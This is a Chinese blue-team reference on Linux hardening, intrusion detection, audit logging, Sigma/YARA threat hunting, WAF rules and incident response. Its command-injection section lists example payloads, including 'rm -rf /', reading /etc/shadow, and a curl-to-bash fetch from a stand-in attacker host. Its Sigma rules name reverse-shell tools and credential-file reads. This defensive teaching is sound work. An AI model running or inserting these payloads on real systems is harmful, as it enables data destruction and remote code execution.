# 蓝队防御技术知识体系

> 本文档为蓝队（防御方）安全运维技术的学习参考，涵盖入侵检测、日志审计、威胁狩猎、命令注入防护等核心领域。
> 来源：基于业界最佳实践（MITRE ATT&CK、CIS Benchmark、OWASP）整理，仅供安全运维人员参考。

---

## 一、Linux 安全加固

### 1.1 最小权限原则 (Principle of Least Privilege)

- **用户权限分离**：禁止直接使用 root，通过 `sudo` 授权特定命令
- **sudoers 最佳实践**：
  ```
  # /etc/sudoers.d/operator
  operator ALL=(ALL) /usr/bin/systemctl restart nginx, /usr/bin/journalctl
  ```
  - 使用 `sudoers.d/` 目录而非直接编辑 `/etc/sudoers`
  - 命令白名单精确到路径，禁止 `ALL` 通配
  - 启用 `requiretty` 限制只能从终端执行 sudo
- **SSH 加固**：
  - `PermitRootLogin no` 禁止 root 远程登录
  - `PasswordAuthentication no` 禁用密码，仅允许密钥
  - `AllowUsers operator admin` 白名单限制可登录用户
  - `MaxAuthTries 3` 限制认证尝试次数
  - 端口改用非标准端口（如 2222），降低自动化扫描风险

### 1.2 CIS Benchmark 核心项

CIS (Center for Internet Security) 提供了系统级安全基线：

| 类别 | 检查项 | 命令/配置 |
|------|--------|-----------|
| 文件系统 | /tmp 独立分区 + noexec | `mount -o remount,noexec,nosuid /tmp` |
| 文件系统 | 禁用不必要的文件系统 | `install cramfs /bin/true` (modprobe.d) |
| 网络 | 禁用 IP 转发 | `sysctl -w net.ipv4.ip_forward=0` |
| 网络 | 启用 SYN Cookie | `sysctl -w net.ipv4.tcp_syncookies=1` |
| 日志 | auditd 覆盖关键目录 | `-w /etc/passwd -p wa -k identity` |
| 认证 | 密码复杂度 | `/etc/security/pwquality.conf` |
| 认证 | 账户锁定策略 | `pam_tally2.so deny=5 unlock_time=900` |

### 1.3 SELinux / AppArmor

**SELinux (RHEL/CentOS/Kylin)**：
```bash
# 查看状态
getenforce          # Enforcing / Permissive / Disabled
sestatus            # 详细状态

# 设置模式
setenforce 1        # 临时切换为 Enforcing

# 查看 AVC 拒绝日志
ausearch -m AVC -ts recent
audit2why -a        # 分析拒绝原因
audit2allow -a      # 生成允许规则

# 永久策略修改
semanage port -a -t http_port_t -p tcp 8080
```

**AppArmor (Ubuntu/Debian)**：
```bash
aa-status                       # 查看状态
aa-enforce /etc/apparmor.d/*    # 强制模式
aa-complain /etc/apparmor.d/*   # 投诉模式（学习期）
```

### 1.4 内核安全参数

```bash
# /etc/sysctl.d/99-security.conf

# 防止 SYN Flood
net.ipv4.tcp_syncookies = 1
net.ipv4.tcp_max_syn_backlog = 2048
net.ipv4.tcp_synack_retries = 2

# 禁止 ICMP 重定向（防止中间人）
net.ipv4.conf.all.accept_redirects = 0
net.ipv4.conf.all.send_redirects = 0

# 启用反向路径过滤（防止 IP 欺骗）
net.ipv4.conf.all.rp_filter = 1

# 禁止源路由
net.ipv4.conf.all.accept_source_route = 0

# 内核地址空间布局随机化 (KASLR)
kernel.randomize_va_space = 2

# 限制 dmesg 访问
kernel.dmesg_restrict = 1

# 限制 kernel pointer 泄露
kernel.kptr_restrict = 2
```

---

## 二、入侵检测系统 (IDS/EDR/HIDS)

### 2.1 检测体系分层

```
┌─────────────────────────────────────────────┐
│ 网络层 (NIDS)   │ Snort / Suricata / Zeek  │ ← 网络流量分析
├─────────────────────────────────────────────┤
│ 主机层 (HIDS)   │ OSSEC / Wazuh / AIDE     │ ← 文件完整性+日志
├─────────────────────────────────────────────┤
│ 终端层 (EDR)    │ CrowdStrike / SentinelOne │ ← 行为分析+响应
├─────────────────────────────────────────────┤
│ 应用层 (WAF)    │ ModSecurity / 云 WAF      │ ← HTTP 攻击检测
└─────────────────────────────────────────────┘
```

### 2.2 文件完整性检测

**AIDE (Advanced Intrusion Detection Environment)**：
```bash
# 安装
yum install aide -y          # RHEL/CentOS
apt install aide -y          # Debian/Ubuntu

# 初始化数据库
aide --init
mv /var/lib/aide/aide.db.new.gz /var/lib/aide/aide.db.gz

# 执行检测
aide --check

# 更新基线（在确认变更合法后）
aide --update

# 配置文件 /etc/aide.conf 关键规则：
# /boot   CONTENT_EX
# /bin    CONTENT_EX
# /sbin   CONTENT_EX
# /etc    CONTENT_EX
# /usr/bin CONTENT_EX
# /usr/sbin CONTENT_EX
# !/var/log     # 排除日志目录（变化频繁）
# !/proc        # 排除虚拟文件系统
```

**核心检测维度**：
- 文件哈希变化 (SHA256/SHA512)
- 文件权限变更 (uid/gid/mode)
- 新增/删除文件
- 文件大小异常变化
- 符号链接篡改

### 2.3 Rootkit 检测

```bash
# rkhunter (Rootkit Hunter)
rkhunter --check --skip-keypress
rkhunter --update              # 更新特征库

# chkrootkit
chkrootkit

# 手动检查方法
# 1. 检查隐藏进程
ps aux | awk '{print $2}' | sort -n > /tmp/ps_pids
ls /proc | grep -E '^[0-9]+$' | sort -n > /tmp/proc_pids
diff /tmp/ps_pids /tmp/proc_pids

# 2. 检查 LD_PRELOAD 劫持
echo $LD_PRELOAD
cat /etc/ld.so.preload

# 3. 检查可疑内核模块
lsmod | grep -i suspicious
cat /proc/modules

# 4. 检查 SUID/SGID 异常文件
find / -perm -4000 -type f 2>/dev/null | xargs ls -la
find / -perm -2000 -type f 2>/dev/null | xargs ls -la

# 5. 检查 /etc/passwd 和 /etc/shadow 异常
awk -F: '$3 == 0 {print}' /etc/passwd    # UID=0 的用户
awk -F: '$2 == "" {print}' /etc/shadow   # 无密码用户
```

### 2.4 Wazuh (OSSEC 增强版) 核心能力

```xml
<!-- /var/ossec/etc/ossec.conf -->
<ossec_config>
  <syscheck>
    <frequency>3600</frequency>  <!-- 每小时检查一次 -->
    <directories check_all="yes">/etc,/usr/bin,/usr/sbin</directories>
    <directories check_all="yes">/bin,/sbin</directories>
  </syscheck>

  <localfile>
    <log_format>syslog</log_format>
    <location>/var/log/secure</location>
  </localfile>

  <localfile>
    <log_format>apache</log_format>
    <location>/var/log/httpd/access_log</location>
  </localfile>
</ossec_config>
```

**Wazuh 规则示例 — 检测暴力破解**：
```xml
<rule id="100001" level="10">
  <if_sid>5712</if_sid>
  <match>sshd</match>
  <description>SSH 暴力破解尝试</description>
  <group>authentication_failures,</group>
</rule>
```

---

## 三、日志审计

### 3.1 auditd 深度配置

```bash
# /etc/audit/rules.d/security.rules

# 监控用户/组变更
-w /etc/passwd -p wa -k identity
-w /etc/group -p wa -k identity
-w /etc/shadow -p wa -k identity
-w /etc/sudoers -p wa -k sudoers

# 监控关键命令执行
-a always,exit -F arch=b64 -S execve -F exe=/usr/bin/sudo -k sudo_usage
-a always,exit -F arch=b64 -S execve -F exe=/usr/bin/passwd -k password_change
-a always,exit -F arch=b64 -S execve -F exe=/usr/bin/useradd -k user_mgmt
-a always,exit -F arch=b64 -S execve -F exe=/usr/bin/userdel -k user_mgmt

# 监控网络配置变更
-w /etc/sysconfig/network -p wa -k network
-w /etc/hosts -p wa -k network

# 监控 cron 变更
-w /etc/crontab -p wa -k cron
-w /etc/cron.d/ -p wa -k cron
-w /var/spool/cron/ -p wa -k cron

# 监控内核模块加载
-a always,exit -F arch=b64 -S init_module -S finit_module -k modules
-a always,exit -F arch=b64 -S delete_module -k modules

# 监控文件删除
-a always,exit -F arch=b64 -S unlink -S unlinkat -S rename -S renameat -F auid>=1000 -F auid!=4294967295 -k delete

# 使规则生效
augenrules --load
systemctl restart auditd
```

**审计日志查询**：
```bash
# 按 key 搜索
ausearch -k identity -ts today
ausearch -k sudo_usage -ts recent

# 生成报告
aureport --summary          # 摘要
aureport --auth --summary   # 认证摘要
aureport --login            # 登录报告
aureport --file --summary   # 文件访问摘要
aureport --anomaly          # 异常报告

# 实时监控
tail -f /var/log/audit/audit.log | grep --line-buffered "EXECVE"
```

### 3.2 日志分析关键模式

**SSH 暴力破解检测**：
```bash
# 统计失败登录 IP
grep "Failed password" /var/log/auth.log | \
  awk '{print $(NF-3)}' | sort | uniq -c | sort -rn | head -20

# 统计每小时失败次数
grep "Failed password" /var/log/auth.log | \
  awk '{print $1,$2,substr($3,1,2)":00"}' | sort | uniq -c | sort -rn

# 检测单 IP 短时间大量尝试（>10次/分钟）
grep "Failed password" /var/log/auth.log | \
  awk '{print $1,$2,$3,$(NF-3)}' | \
  awk -F: '{print $1":"$2}' | sort | uniq -c | sort -rn | awk '$1>10'
```

**异常登录检测**：
```bash
# 非工作时间登录 (00:00-06:00)
last -t $(date +%Y%m%d)0600 | grep -v "^$"

# 新 IP 登录
last | awk '{print $3}' | sort -u > /tmp/current_ips
# (与历史白名单对比)

# root 直接登录
grep "Accepted.*root" /var/log/auth.log

# sudo 提权使用
grep "sudo:" /var/log/auth.log | grep "COMMAND"
```

**Web 攻击日志分析**：
```bash
# SQL 注入特征
grep -iE "(union.*select|1=1|or.*=|' *or|drop\s+table|insert\s+into|--\s*$)" /var/log/nginx/access.log

# XSS 特征
grep -iE "(<script|javascript:|onerror=|onload=|alert\()" /var/log/nginx/access.log

# 目录遍历
grep -iE "(\.\./|\.\.\\|%2e%2e)" /var/log/nginx/access.log

# 扫描器 User-Agent
grep -iE "(sqlmap|nikto|nmap|masscan|zgrab|dirbuster|gobuster)" /var/log/nginx/access.log
```

### 3.3 SIEM 集成架构

```
数据源              采集层              存储/分析层          展示层
┌──────────┐     ┌──────────┐      ┌──────────┐      ┌──────────┐
│ Syslog   │────▶│ Filebeat │────▶│Elasticsearch│───▶│  Kibana  │
│ Auditd   │     │ Rsyslog  │      │  (存储)   │      │ (可视化) │
│ App Logs │     │ Promtail │      └──────────┘      └──────────┘
│ Wazuh    │────▶│          │      ┌──────────┐      ┌──────────┐
│ Network  │     │          │────▶│  Sigma    │────▶│ 检测规则  │
└──────────┘     └──────────┘      └──────────┘      └──────────┘
```

---

## 四、威胁狩猎 (Threat Hunting)

### 4.1 Sigma 规则

Sigma 是通用的日志检测规则格式，可转换为 Splunk/ELK/QRadar 等平台的查询语句。

**基本结构**：
```yaml
title: 可疑 PowerShell 下载执行
id: d6b5024d-5a66-4f47-a34c-4a5520455555
status: experimental
description: 检测 PowerShell 下载并执行远程脚本
references:
  - https://attack.mitre.org/techniques/T1059/001/
author: Blue Team
date: 2024/01/01
tags:
  - attack.execution
  - attack.t1059.001
logsource:
  category: process_creation
  product: windows
detection:
  selection:
    Image|endswith: '\powershell.exe'
    CommandLine|contains:
      - 'Invoke-WebRequest'
      - 'IEX'
      - 'DownloadString'
      - 'Net.WebClient'
  condition: selection
level: high
```

**Linux Sigma 规则示例**：

```yaml
# 检测反向 Shell
title: Linux 反向 Shell 检测
logsource:
  category: process_creation
  product: linux
detection:
  selection_net:
    CommandLine|contains:
      - '/dev/tcp/'
      - 'nc -e'
      - 'ncat -e'
      - 'bash -i'
      - 'python -c'
      - 'perl -e'
      - 'ruby -rsocket'
  condition: selection_net
level: critical
tags:
  - attack.execution
  - attack.t1059.004

---
# 检测敏感文件读取
title: 敏感文件读取
logsource:
  category: process_creation
  product: linux
detection:
  selection:
    CommandLine|contains:
      - '/etc/shadow'
      - '/etc/passwd'
      - '/etc/sudoers'
      - '.ssh/id_rsa'
      - '.ssh/authorized_keys'
  filter:
    User: 'root'
  condition: selection and not filter
level: high

---
# 检测历史清理
title: Shell 历史记录清除
logsource:
  category: process_creation
  product: linux
detection:
  selection:
    CommandLine|contains:
      - 'history -c'
      - 'history -w'
      - 'rm -f .bash_history'
      - 'cat /dev/null > .bash_history'
      - 'ln -sf /dev/null .bash_history'
  condition: selection
level: medium
```

### 4.2 YARA 规则

```yara
rule Linux_Rootkit_Generic {
    meta:
        description = "检测通用 Linux Rootkit 特征"
        author = "Blue Team"
        date = "2024-01-01"
    strings:
        $s1 = "getdents" ascii
        $s2 = "/proc" ascii
        $s3 = "hide_pid" ascii
        $s4 = "module_hide" ascii
        $elf = {7F 45 4C 46}
    condition:
        $elf at 0 and 2 of ($s*)
}

rule Webshell_PHP_Generic {
    meta:
        description = "检测通用 PHP Webshell"
    strings:
        $s1 = "eval($_" ascii
        $s2 = "eval(base64_decode" ascii
        $s3 = "assert($_" ascii
        $s4 = "system($_" ascii
        $s5 = "passthru($_" ascii
        $s6 = "shell_exec($_" ascii
    condition:
        any of them
}
```

### 4.3 IOC 匹配

常见 IOC (Indicators of Compromise) 类型：

| IOC 类型 | 示例 | 检测方法 |
|----------|------|----------|
| IP 地址 | 103.x.x.x (已知C2) | 防火墙日志、DNS日志比对 |
| 域名 | evil.example.com | DNS 查询日志分析 |
| 文件哈希 | SHA256:abc123... | AIDE/文件完整性检测 |
| URL 路径 | /uploads/shell.php | Web 访问日志 |
| 邮件地址 | phish@evil.com | 邮件网关日志 |
| 进程名 | kworkerds (挖矿) | 进程列表监控 |
| 用户代理 | sqlmap/1.0 | HTTP 请求头分析 |

**自动化 IOC 检测脚本思路**：
```bash
# 从威胁情报源获取 IOC 列表
# 比对系统日志中的 IP/域名/哈希
# 输出匹配的告警

# 示例：检查出站连接是否命中恶意 IP
ss -tnp | awk '{print $5}' | cut -d: -f1 | sort -u | \
while read ip; do
  if grep -q "$ip" /etc/threat_intel/malicious_ips.txt; then
    echo "ALERT: 匹配恶意 IP: $ip"
  fi
done
```

---

## 五、命令注入防护

### 5.1 Shell 注入攻击类型

```bash
# 1. 命令链注入
; rm -rf /                  # 分号链
| cat /etc/shadow           # 管道注入
&& curl attacker.com/shell.sh | bash  # 逻辑链

# 2. 反引号/子命令注入
`cat /etc/shadow`           # 反引号
$(cat /etc/shadow)          # $() 子命令

# 3. 通配符注入
chmod 777 /etc/*            # 通配符滥用
tar cf /dev/null --checkpoint=1 --checkpoint-action=exec=id  # tar 特性利用

# 4. 编码绕过
%0a                         # 换行符注入
$'\x2f'                     # 八进制编码绕过

# 5. IFS (Internal Field Separator) 注入
${IFS}rm${IFS}-rf${IFS}/    # 用 IFS 替代空格
```

### 5.2 防御策略

**输入验证**：
```python
import re
import shlex

# 1. 白名单验证（最佳实践）
ALLOWED_COMMANDS = {'ls', 'cat', 'df', 'free', 'uptime', 'ps', 'ss'}

def validate_command(cmd: str) -> bool:
    """白名单验证命令"""
    first_word = shlex.split(cmd)[0] if cmd.strip() else ''
    return first_word in ALLOWED_COMMANDS

# 2. 特殊字符检测
DANGEROUS_PATTERNS = [
    r'[;&|`$]',           # Shell 特殊字符
    r'\.\./',              # 路径遍历
    r'\\x[0-9a-fA-F]{2}', # 十六进制编码
    r'\$\{[^}]+\}',       # 变量展开
]

def detect_injection(cmd: str) -> bool:
    """检测注入模式"""
    for pattern in DANGEROUS_PATTERNS:
        if re.search(pattern, cmd):
            return True
    return False

# 3. 使用 subprocess 安全执行
import subprocess

def safe_execute(cmd: str) -> str:
    """安全执行命令 — 避免 shell=True"""
    args = shlex.split(cmd)  # 安全分割参数
    result = subprocess.run(
        args,
        capture_output=True,
        text=True,
        timeout=30,
        shell=False,  # 关键：禁用 shell 解释
    )
    return result.stdout
```

**沙箱隔离**：
```bash
# 1. 使用 unshare 创建隔离 namespace
unshare --mount --uts --ipc --net --pid --fork -- /bin/bash

# 2. 使用 firejail
firejail --net=none --private --noroot --no-sound --no-video ls

# 3. 使用 bubblewrap
bwrap --ro-bind / / --dev /dev --tmpfs /tmp --unshare-net -- ls

# 4. cgroup 资源限制
cgcreate -g cpu,memory:/sandbox
cgset -r memory.limit_in_bytes=256M /sandbox
cgexec -g cpu,memory:/sandbox your_command
```

### 5.3 WAF 规则

**ModSecurity 核心规则集 (CRS)**：
```
# 检测 SQL 注入
SecRule ARGS "@rx (?i:(union|select|insert|update|delete|drop)\s)" \
  "id:1001,phase:2,deny,status:403,msg:'SQL Injection Detected'"

# 检测命令注入
SecRule ARGS "@rx [;&|`$]\s*(" \
  "id:1002,phase:2,deny,status:403,msg:'Command Injection Detected'"

# 检测路径遍历
SecRule ARGS "@rx \.\./|\.\.\\|%2e%2e" \
  "id:1003,phase:2,deny,status:403,msg:'Path Traversal Detected'"
```

---

## 六、网络防御

### 6.1 iptables/nftables 最佳实践

```bash
# iptables 基础安全策略

# 1. 默认策略：拒绝所有入站，允许出站
iptables -P INPUT DROP
iptables -P FORWARD DROP
iptables -P OUTPUT ACCEPT

# 2. 允许回环接口
iptables -A INPUT -i lo -j ACCEPT

# 3. 允许已建立连接
iptables -A INPUT -m state --state ESTABLISHED,RELATED -j ACCEPT

# 4. 允许 SSH（限制来源）
iptables -A INPUT -p tcp --dport 22 -s 10.0.0.0/8 -j ACCEPT

# 5. 允许 HTTP/HTTPS
iptables -A INPUT -p tcp --dport 80 -j ACCEPT
iptables -A INPUT -p tcp --dport 443 -j ACCEPT

# 6. 防 SYN Flood
iptables -A INPUT -p tcp --syn -m limit --limit 1/s --limit-burst 3 -j ACCEPT
iptables -A INPUT -p tcp --syn -j DROP

# 7. 防端口扫描
iptables -A INPUT -p tcp --tcp-flags ALL NONE -j DROP
iptables -A INPUT -p tcp --tcp-flags ALL ALL -j DROP

# 8. 限制 ICMP
iptables -A INPUT -p icmp --icmp-type echo-request -m limit --limit 1/s -j ACCEPT
iptables -A INPUT -p icmp --icmp-type echo-request -j DROP

# 9. 记录并丢弃其他
iptables -A INPUT -j LOG --log-prefix "IPT_DROP: " --log-level 4
iptables -A INPUT -j DROP

# 10. 保存规则
iptables-save > /etc/sysconfig/iptables  # RHEL
iptables-save > /etc/iptables/rules.v4   # Debian
```

**nftables 现代写法**：
```nft
#!/usr/sbin/nft -f
flush ruleset

table inet filter {
    chain input {
        type filter hook input priority 0; policy drop;
        
        # 允许已建立连接
        ct state established,related accept
        
        # 允许回环
        iif lo accept
        
        # 允许 SSH
        tcp dport 22 ct state new limit rate 3/minute accept
        
        # 允许 HTTP/HTTPS
        tcp dport { 80, 443 } accept
        
        # 记录并丢弃
        log prefix "nft-drop: " drop
    }
    
    chain forward {
        type filter hook forward priority 0; policy drop;
    }
    
    chain output {
        type filter hook output priority 0; policy accept;
    }
}
```

### 6.2 Suricata (IDS/IPS)

```yaml
# /etc/suricata/suricata.yaml 关键配置
vars:
  address-groups:
    HOME_NET: "[10.0.0.0/8,172.16.0.0/12,192.168.0.0/16]"
    EXTERNAL_NET: "!$HOME_NET"

outputs:
  - fast:
      enabled: yes
      filename: fast.log
  - eve-log:
      enabled: yes
      filetype: regular
      filename: eve.json
      types:
        - alert
        - http
        - dns
        - tls

# 启动
suricata -c /etc/suricata/suricata.yaml -i eth0

# 更新规则
suricata-update
suricata-update list-sources
```

---

## 七、应急响应流程

### 7.1 事件响应六步法

```
┌─────────┬──────────┬──────────┬──────────┬──────────┬──────────┐
│  准备    │  识别    │  遏制    │  根除    │  恢复    │  总结    │
│ Prepare │ Identify │Contain   │Eradicate │ Recover  │Lessons   │
└─────────┴──────────┴──────────┴──────────┴──────────┴──────────┘
```

### 7.2 常见入侵排查命令速查

```bash
# === 快速排查 Checklist ===

# 1. 最近登录
last -20 && echo "---" && lastb -10 && echo "---" && who

# 2. 可疑进程
ps auxf | grep -v '\[' | head -40
top -bn1 | head -20

# 3. 网络连接
ss -tlnp                    # 监听端口
ss -tnp                     # 已建立连接
netstat -an | grep ESTABLISHED | awk '{print $5}' | cut -d: -f1 | sort | uniq -c | sort -rn

# 4. 计划任务
crontab -l
ls -la /etc/cron.*
for user in $(cut -f1 -d: /etc/passwd); do crontab -u $user -l 2>/dev/null; done

# 5. 启动项
systemctl list-unit-files --type=service --state=enabled
ls -la /etc/init.d/
cat /etc/rc.local

# 6. 可疑文件
find /tmp -type f -executable -ls
find /var/tmp -type f -executable -ls
find /dev -type f -ls
find / -name ".*" -type f -mtime -3 2>/dev/null

# 7. SSH 后门检查
ls -la ~/.ssh/
cat ~/.ssh/authorized_keys
find / -name "authorized_keys" 2>/dev/null

# 8. 系统完整性
rpm -Va 2>/dev/null | grep '^..5'   # RHEL
debsums -c 2>/dev/null               # Debian

# 9. 异常用户
awk -F: '$3==0{print}' /etc/passwd
awk -F: '$2==""{print}' /etc/shadow
grep ':0:' /etc/passwd

# 10. 内核模块
lsmod | sort
cat /proc/modules | head -20
```

### 7.3 取证保全

```bash
# 1. 创建内存镜像（需要 LiME）
sudo insmod lime.ko "path=/tmp/mem.lime format=lime"

# 2. 磁盘镜像
dd if=/dev/sda of=/mnt/external/disk.img bs=4M status=progress

# 3. 保存日志快照
tar czf /tmp/logs_$(date +%Y%m%d_%H%M%S).tar.gz \
  /var/log/ /etc/ /root/.bash_history

# 4. 网络状态快照
ss -tnp > /tmp/ss_tnp.txt
iptables -L -n > /tmp/iptables.txt
ip addr > /tmp/ip_addr.txt
ip route > /tmp/ip_route.txt

# 5. 计算文件哈希（保全证据链）
find / -type f -mtime -1 -exec sha256sum {} \; > /tmp/recent_files_hash.txt

# 6. 记录时间线
echo "=== $(date) ===" >> /tmp/timeline.txt
last -50 >> /tmp/timeline.txt
journalctl --since "24 hours ago" --no-pager >> /tmp/timeline.txt
```

---

## 八、安全工具链总结

| 阶段 | 工具 | 用途 |
|------|------|------|
| 预防 | SELinux/AppArmor | 强制访问控制 |
| 预防 | iptables/nftables | 网络访问控制 |
| 预防 | auditd | 审计日志记录 |
| 预防 | fail2ban | 自动封锁暴力破解 |
| 检测 | AIDE/Tripwire | 文件完整性 |
| 检测 | OSSEC/Wazuh | HIDS 综合检测 |
| 检测 | Suricata/Snort | 网络入侵检测 |
| 检测 | Sigma/YARA | 威胁规则匹配 |
| 响应 | rkhunter/chkrootkit | Rootkit 检查 |
| 响应 | LiME/volatility | 内存取证 |
| 响应 | dd/FTK Imager | 磁盘取证 |
| 分析 | ELK Stack | 日志聚合分析 |
| 分析 | Sigma Rules | 检测规则库 |

---

## 九、参考资源

- **MITRE ATT&CK**: https://attack.mitre.org/
- **CIS Benchmarks**: https://www.cisecurity.org/cis-benchmarks
- **Sigma Rules**: https://github.com/SigmaHQ/sigma
- **OWASP**: https://owasp.org/
- **NIST SP 800-53**: 安全和隐私控制
- **SANS Blue Team**: https://www.sans.org/blue-team/
- **Wazuh Documentation**: https://documentation.wazuh.com/
- **Suricata Rules**: https://rules.emergingthreats.net/

---

## 十、系统剧本交叉索引

知识库中已内置以下安全剧本(Playbook)，与本文档各章节对应：

| 剧本 ID | 标题 | 对应章节 |
|---------|------|----------|
| PB-ROOT-01 | root 增删改查须人工确认 | 一·1.1 最小权限 |
| PB-ROOT-02 | 只读 root 观测允许 | 一·1.1 最小权限 |
| PB-KYLIN-01 | 银河麒麟与 kysec | 一·1.3 SELinux |
| PB-BT-SYS-01 | 内核安全参数加固 | 一·1.4 内核安全参数 |
| PB-BT-SYS-02 | SELinux/AppArmor 强制访问控制 | 一·1.3 SELinux |
| PB-BT-AUDIT-01 | auditd 关键路径审计 | 三·3.1 auditd 配置 |
| PB-BT-AUDIT-02 | 文件完整性监控(AIDE) | 二·2.2 文件完整性 |
| PB-BT-IDS-01 | Suricata/Snort IDS 部署 | 二·2.1 检测体系 + 六·6.2 |
| PB-BT-WAF-01 | WebShell 检测与处置 | 四·4.2 YARA + 七·7.2 排查 |
| PB-BT-WAF-02 | ModSecurity WAF 规则 | 五·5.3 WAF 规则 |
| PB-BT-HUNT-01 | ThreatHunter 异常进程排查 | 二·2.3 Rootkit + 七·7.2 排查 |
| PB-BT-HUNT-02 | SSH 后门与用户审计 | 一·1.1 SSH 加固 + 七·7.2 |
| PB-BT-SIGMA-01 | Sigma 检测规则编写 | 四·4.1 Sigma 规则 |
| PB-BT-SIGMA-02 | 攻击链检测与日志关联 | 四·4.1 + 三·3.3 SIEM |
| PB-BT-SCAN-01 | 巡风资产安全扫描 | 七·7.2 排查 |
| PB-BT-KB-01 | 蓝队应急响应知识库 | 七·7.1 六步法 |
| PB-BT-API-01 | API 限流与 CC 防御 | 五·5.2 防御策略 |
| PB-BT-API-02 | 熔断器与故障隔离 | 五·5.2 防御策略 |
| PB-BT-LOG-01 | 日志异常检测与行为分析 | 三·3.2 日志分析 |
| PB-BT-LOG-02 | 日志关联分析方法 | 三·3.2 + 三·3.3 SIEM |
| PB-BT-IR-01 | 完整应急响应流程 | 七·7.1 六步法 |
| PB-BT-NET-03 | iptables/nftables 安全策略 | 六·6.1 iptables |
| PB-BT-TI-01 | IOC 威胁情报自动化匹配 | 四·4.3 IOC 匹配 |
| PB-BT-TI-02 | YARA 规则恶意样本检测 | 四·4.2 YARA 规则 |
| PB-PORT-01 | 端口暴露与对外监听 | 六·6.1 防火墙 |
| PB-PERM-01 | 敏感路径可写 | 一·1.1 + 七·7.2 |
| PB-NET-01 | 异常外连研判 | 四·4.3 IOC |
| PB-NET-02 | 反向 shell 迹象 | 五·5.1 注入类型 + 四·4.1 Sigma |
| PB-EXFIL-01 | 伪装与窃密进程特征 | 二·2.3 Rootkit |
| PB-EXFIL-02 | 敏感文件外传路径 | 五·5.1 + 七·7.2 |
| PB-IMPERSON-01 | 进程名伪装 | 二·2.3 Rootkit |
| PB-CRON-01 | 持久化 cron/systemd | 七·7.2 排查 |
| PB-DOCKER-01 | 容器逃逸与特权容器 | 一·1.1 最小权限 |
| PB-MON-01 | 监控无死角检查清单 | 二 + 三 + 七 |
| PB-MISDELETE-01 | 拦截进程前必须二次确认 | 七·7.1 遏制阶段 |
| PB-BACKUP-01 | 误删恢复 | 七·7.1 恢复阶段 |
| PB-HOST-01 | 主机沦陷应急 | 七·7.1 全流程 |
| PB-TERMINAL-01 | 终端白名单边界 | 五·5.2 白名单验证 |
| PB-ADVICE-01 | 人性化回复结构 | 七·7.1 总结阶段 |
| PB-ADVICE-02 | 处置优先级 | 七·7.1 遏制→根除 |

*本文档仅供安全运维人员学习参考，请在授权范围内合法使用安全工具和技术。*